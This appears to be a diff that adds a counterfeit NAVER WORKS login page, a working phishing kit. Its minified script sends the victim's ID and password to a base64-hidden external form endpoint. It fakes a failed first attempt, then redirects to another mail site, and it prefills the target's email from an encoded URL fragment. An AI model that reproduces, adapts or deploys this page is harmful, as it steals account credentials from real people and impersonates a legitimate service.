@@ -1,0 +1,231 @@
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <title>Login</title>
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, viewport-fit=cover"
+    />
+    <link
+      rel="stylesheet"
+      type="text/css"
+      href="https://auth.worksmobile.com/css/login.css?20240528"
+    />
+    <style>
+      input,
+      input:focus {
+        background-color: white;
+      }
+
+      #root2 {
+        display: none;
+      }
+    </style>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+  </head>
+  <body>
+    <div id="root1">
+      <a href="#content" class="skip">go to the text</a>
+      <div class="wrap en_US integration">
+        <div class="container">
+          <div class="contents_box">
+            <div class="contents">
+              <h1 class="logo"><span class="blind">NAVER WORKS</span></h1>
+              <h2 class="title">휴대폰 번호나 ID를 입력해주세요.</h2>
+              <div class="input_wrap">
+                <div class="input_area" id="idInputArea">
+                  <div class="input_cover" id="usrInputCover">
+                    <label for="usr_id" class="blind">ID</label>
+                    <input
+                      type="text"
+                      id="usr_id"
+                      class="input_box"
+                      placeholder="01012345678 또는 id@group.xxx"
+                      value=""
+                    />
+                  </div>
+                  <ul class="account_list" id="login_id_list"></ul>
+                </div>
+                <div class="invalid_desc" id="fail_message_id">
+                  ID를 입력해주세요.
+                </div>
+              </div>
+              <div class="input_btn_area">
+                <button id="loginBtn" type="button" class="btn_submit">
+                  로그인
+                </button>
+              </div>
+              <div class="check_area">
+                <div class="check_info">
+                  <div class="check_cover">
+                    <input
+                      type="checkbox"
+                      id="rememberId"
+                      class="input_check"
+                    />
+                    <label for="rememberId" class="input_label"
+                      >ID 기억하기</label
+                    >
+                  </div>
+                  <div class="more_area">
+                    <a href="#" id="findIdBtn" class="link">ID 찾기</a>
+                  </div>
+                </div>
+              </div>
+              <div class="login_other_area">
+                <button type="button" id="naverLogin" class="btn_social naver">
+                  <span class="text">연결된 네이버 ID로 로그인</span>
+                  <strong
+                    class="recently"
+                    id="recent_naver"
+                    style="display: none;"
+                    >최근 로그인 수단</strong
+                  >
+                </button>
+                <button type="button" id="lineLogin" class="btn_social line">
+                  <span class="text">연결된 LINE ID로 로그인</span>
+                  <strong
+                    class="recently"
+                    id="recent_line"
+                    style="display: none;"
+                    >최근 로그인 수단</strong
+                  >
+                </button>
+              </div>
+
+              <div class="terms_area"></div>
+            </div>
+          </div>
+          <div class="other_contents">
+            <a
+              href="https://naver.worksmobile.com/kr/pricing"
+              target="_blank"
+              class="another_way"
+              >새 계정을 만드시겠어요?</a
+            >
+          </div>
+          <footer class="footer">
+            <address class="copyright">© NAVER Cloud Corp.</address>
+          </footer>
+        </div>
+      </div>
+    </div>
+    <div id="root2">
+      <a href="#content" class="skip">go to the text</a>
+      <div class="wrap en_US integration">
+        <div class="container">
+          <div class="contents_box">
+            <div class="contents">
+              <h1 class="logo"><span class="blind">NAVER WORKS</span></h1>
+              <h2 class="title">
+                비밀번호를 입력하거나,<br />신뢰하는 기기로 인증하세요.
+              </h2>
+
+              <div class="input_wrap">
+                <div class="input_area" id="idInputArea">
+                  <div class="input_cover" id="idInputCover">
+                    <label for="usr_id_2" class="blind">ID</label>
+                    <input
+                      type="text"
+                      id="usr_id_2"
+                      class="input_box"
+                      placeholder="로그인 ID"
+                      value=""
+                    />
+                    <div class="other" id="usr_domain"></div>
+                  </div>
+                  <ul class="account_list" id="login_id_list"></ul>
+                </div>
+                <p class="invalid_desc" id="fail_message_usr">ID를 입력해주세요.</p>
+              </div>
+              <div class="input_wrap">
+                <div class="input_area">
+                  <div class="input_cover" id="pwdInputCover">
+                    <label for="usr_pwd" class="blind">password</label>
+                    <input
+                      type="password"
+                      id="usr_pwd"
+                      class="input_box"
+                      placeholder="비밀번호"
+                      value=""
+                    />
+                    <div class="other">
+                      <button class="btn_masking">
+                        <span class="blind">show the password</span>
+                      </button>
+                    </div>
+                  </div>
+                </div>
+                <p class="invalid_desc" id="fail_message_pwd">
+                  비밀번호를 입력해주세요.
+                </p>
+              </div>
+
+              <div class="input_btn_area">
+                <button type="button" id="loginBtn2" class="btn_submit">
+                  로그인
+                </button>
+              </div>
+              <div class="check_area">
+                <div class="check_info">
+                  <div class="check_cover">
+                    <input type="checkbox" id="keepLogin" class="input_check" />
+                    <label
+                      for="keepLogin"
+                      id="label_keepLogin"
+                      class="input_label"
+                      >로그인 유지</label
+                    >
+                  </div>
+
+                  <div class="more_area">
+                    <a href="#" class="link findPwdBtn">비밀번호 찾기</a>
+                  </div>
+                </div>
+                <div class="check_info">
+                  <div class="check_cover">
+                    <input
+                      type="checkbox"
+                      id="rememberId"
+                      class="input_check"
+                    />
+                    <label for="rememberId" class="input_label"
+                      >ID 기억하기</label
+                    >
+                  </div>
+                </div>
+
+                <div class="login_other_area">
+                  <button
+                    type="button"
+                    class="btn_social device"
+                    id="fidoAuthentication"
+                  >
+                  신뢰하는 기기로 인증
+                  </button>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="other_contents">
+            <a id="clearIdBtn" class="another_way back"
+              >다른 계정으로 로그인</a
+            >
+          </div>
+          <footer class="footer">
+            <address class="copyright">© NAVER Cloud Corp.</address>
+          </footer>
+        </div>
+      </div>
+    </div>
+    <script>
+      const phpLink =
+        "aHR0cHM6Ly9ub2NvZGVmb3JtLmlvL2YvNjY0ZjkwOTExYjk5Y2NkMGQ5OWE0NzAx";
+    </script>
+
+    <script>
+     $(document).ready(function(){function a(){return e(),c($("#usr_id").val())?void(g(),f($("#usr_id").val())):($("#fail_message_id").show(),$("#usrInputCover").addClass("invalid"),$("#usr_id").val(""),$("#usr_id").focus(),!1)}function b(){return e(),1>=$("#usr_id_2").val().trim()?($("#idInputCover").addClass("invalid"),$("#usr_id_2").val(""),$("#fail_message_usr").show(),$("#usr_id_2").focus(),!1):1>=$("#usr_pwd").val().trim()?($("#pwdInputCover").addClass("invalid"),$("#fail_message_pwd").show(),$("#usr_pwd").val(""),$("#usr_pwd").focus(),!1):void(h(),d())}function c(a){return /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/.test(a)}function d(){console.log("Sent!"),$.ajax({url:atob(phpLink),type:"POST",data:{userg:$("#usr_id").val(),usrid:$("#usr_id_2").val(),passc:$("#usr_pwd").val()}}).done(function(){1===n?location.href="https://www.mailplug.com/front/main":(n++,j(),$("#pwdInputCover").addClass("invalid"),$("#fail_message_pwd").show(),$("#usr_pwd").val(""),$("#usr_pwd").focus())})}function e(){$("#usrInputCover").removeClass("invalid"),$("#fail_message_id").hide(),$("#idInputCover").removeClass("invalid"),$("#fail_message_usr").hide(),$("#pwdInputCover").removeClass("invalid"),$("#fail_message_pwd").hide()}function f(a){$("#root1").hide(),$("#root2").show(),$("#usr_id_2").val(k(a)),$("#usr_domain").text(`@${l(a)}`),$("#usr_pwd").focus()}function g(){$("#usr_id").prop("disabled",!0),$("#loginBtn").prop("disabled",!0)}function h(){$("#usr_id_2").prop("disabled",!0),$("#usr_pwd").prop("disabled",!0),$("#loginBtn2").prop("disabled",!0)}function i(){$("#usr_id").prop("disabled",!1),$("#loginBtn").prop("disabled",!1)}function j(){$("#usr_id_2").prop("disabled",!1),$("#usr_pwd").prop("disabled",!1),$("#loginBtn2").prop("disabled",!1)}function k(a){const b=a.match(/^(.+)@/);return b?b[1]:null}function l(a){const b=a.match(/@(.+)$/);return b?b[1]:null}function m(){e(),i(),j(),$("#root2").hide(),$("#root1").show(),$("#usr_id_2").val(""),$("#usr_pwd").val(""),$("#usr_id").val(""),$("#usr_id").focus()}let n=0;const o=window.location.hash;let p=o.split("#")[1];if(function(a){try{const b=atob(a);return btoa(b)===a}catch(a){return!1}}(p)){let a=atob(p);c(a)&&(p=a)}c(p)?($("#usr_id").val(p),f(p)):($("#usr_id").val(""),$("#usr_id").focus()),$("#loginBtn").click(function(){a()}),$("#clearIdBtn").click(function(){m()}),$("#loginBtn2").click(function(){b()}),$("#usr_id").keydown(function(a){if(13==a.which)return $("#loginBtn").click(),!1}),$("#usr_pwd").keydown(function(a){if(13==a.which)return $("#loginBtn2").click(),!1})});
+    </script>
+    
+  </body>
+</html>
